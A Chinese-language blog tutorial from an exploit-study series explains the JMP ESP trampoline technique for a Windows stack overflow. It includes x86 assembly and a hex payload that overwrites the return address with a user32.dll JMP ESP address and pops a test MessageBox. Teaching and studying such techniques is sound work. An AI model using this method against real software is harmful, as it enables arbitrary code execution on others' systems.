---
title: 漏洞利用学习笔记-002-ESP跳板
description: ShellCode的动态定位法-ESP跳板法
date: 2020-10-19 18:20:00+0800
categories:
    - 漏洞利用
tags:
    - Windows
    - ShellCode
---

> [点击此处下载本文附可执行程序，shellcode文件](./exploit-study-02.zip)

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞利用学习笔记-002-esp跳板/)

## 栈空间移位

ShellCode在内存中往往是动态的，并非直接填写一个定值  
也就是前一篇中buffer数组的栈空间地址，并非总是个定值  
当CPU执行到此地址时，有可能触发无效指令异常导致程序崩溃，ShellCode无法运行

### 原理

从程序已加载的系统DLL中查找一个`JMP ESP`指令的地址，用此地址去淹没返回地址  
这样既能精准定位shellcode的位置，又能适应栈空间的动态变化  
栈的地址是上小下大，CPU的执行顺序是小地址到大地址，栈淹没同样从小地址淹没到大地址  
这样只要将前面的一段空间淹没为无意义数据，将ShellCode的开始恰好淹没在`[ESP]`处，就可以达到ShellCode动态寻址

### ShellCode编写

#### 结构

无用数据+`JMP ESP`地址(此地址恰好淹没到函数返回地址)+命令代码(用于测试，MessageBox弹窗)

> 说明：
>
> - `retn`后将会跳到`JMP ESP`处，随后ESP + 4
> - `JMP ESP`后将会正好跳到命令代码处

#### 必要数据

- `JMP ESP`地址：位于User32.dll中`0x77D29353`(没必要必须是原版命令，只要搜二进制`0xFFE4`即可)
- 垃圾数据大小：52 Byte = Buffer(44 Byte) + authenticated(4 Byte) + EBP(4 Byte)

#### 最终Code

> 以下是需要执行的命令代码

```x86asm
33DB                      xor ebx,ebx
53                        push ebx
68 6D756F6F               push 0x6F6F756D
68 4D6F656F               push 0x6F656F4D
8BC4                      mov eax,esp
53                        push ebx
50                        push eax
50                        push eax
53                        push ebx
B8 EA07D577               mov eax,user32.MessageBoxA
FFD0                      call eax
B8 FACA817C               mov eax,kernel32.ExitProcess
FFD0                      call eax
```

> 最终的ShellCode

```c
34 33 32 31 34 33 32 31  34 33 32 31 34 33 32 31
34 33 32 31 34 33 32 31  34 33 32 31 34 33 32 31
34 33 32 31 34 33 32 31  34 33 32 31 34 33 32 31
34 33 32 31 53 93 D2 77  33 DB 53 68 6D 75 6F 6F
68 4D 6F 65 6F 8B C4 53  50 50 53 B8 EA 07 D5 77
FF D0 B8 FA CA 81 7C FF  D0
```
